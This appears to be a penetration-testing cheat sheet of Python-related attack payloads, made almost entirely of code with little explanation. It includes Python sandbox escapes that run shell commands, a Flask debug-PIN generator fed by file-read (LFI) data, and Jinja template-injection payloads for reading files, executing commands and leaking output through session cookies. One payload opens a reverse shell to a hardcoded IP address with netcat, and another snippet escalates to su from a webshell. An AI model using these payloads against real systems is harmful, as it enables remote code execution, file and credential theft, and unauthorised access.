# Python

### Bypass python builtins none

#### Python2

```python
().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('whoami')
```

#### Python3

```python
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
```

### QRCode from Terminal Output

```python
#!/usr/bin/env python2
from pwn import *
from subprocess import check_output
import subprocess

p = remote('host',1234)
img = p.recvuntil("[+]")
print(img)
subprocess.call("gnome-screenshot -f x.png", shell=True)
output = subprocess.check_output("zbarimg x.png ", shell=True)
print(output)
p.interactive()
```

### Flask Debug Pin from LFI

Get the values for "probably\_public\_bits" from a Stacktrace, then run the script to get the PIN.

```python
import hashlib
from itertools import chain
probably_public_bits = [
    '',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052358410',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '258f132cd7e647caaf5510e3aca997c1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

### SSTI Jinja

#### Read File

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
{% raw %}
{%include+request.application.__globals__.__builtins__[request.args.import](request.args.os).popen(request.args.cmd).read().__str__()%}
{% endraw %}&import=__import__&os=os&cmd=ls
```

#### Read Command Output into Cookie

```
?a=somevalue&name={% raw %}
{%%20if%20session.update({request.args.a:%20True})%20%}{%endif%}
?a=os&b=ls&name={% if session.update({request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read(): True}) %}{%endif%}
{% endraw %}
```

#### RCE

```
{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
```

Alternative:

```
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("nc.traditional 10.10.14.188 2000 -e /bin/sh").read()}}{%endif%}{% endfor %}
{% endraw %}
```

#### [Sneaky ](https://www.sans.org/blog/sneaky-stealthy-su-in-web-shells/)SU from Webshell

```
cmd=(sleep 1; echo password) | python3 -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
```



#### Resources

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection)
